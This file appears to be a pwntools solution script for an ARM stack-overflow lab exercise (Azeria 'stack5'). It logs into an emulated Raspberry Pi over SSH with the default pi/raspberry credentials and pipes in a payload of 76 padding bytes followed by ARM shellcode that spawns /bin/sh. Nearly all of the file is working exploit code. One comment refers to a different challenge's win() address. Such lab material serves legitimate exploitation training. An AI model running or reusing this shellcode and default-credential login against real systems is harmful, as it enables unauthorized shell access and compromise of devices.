#!/usr/bin/python3
from pwn import *
# change port for your machine
s = ssh(host='localhost', user='pi', password='raspberry', port=5022)
# overflowing the buffer modifies the stack
# win() is at address0001044c <win>: from objdump -d stack3
exploit = b'python -c \'print "\\x90"*76+"'
exploit += b'\\x01\\x30\\x8f\\xe2'
exploit += b'\\x13\\xff\\x2f\\xe1'
exploit += b'\\x78\\x46\\x0a\\x30'
exploit += b'\\x01\\x90\\x01\\xa9'
exploit += b'\\x92\\x1a\\x0b\\x27'
exploit += b'\\x01\\xdf\\x2f\\x2f'
exploit += b'\\x62\\x69\\x6e\\x2f'
exploit += b'\\x73\\x68" | '
exploit += b'~/binary-exploitation-solution-scripts/azeriaARMchallenges/stack5sol/stack5'
sh = s.shell('bash')
sh.interactive()
s.close()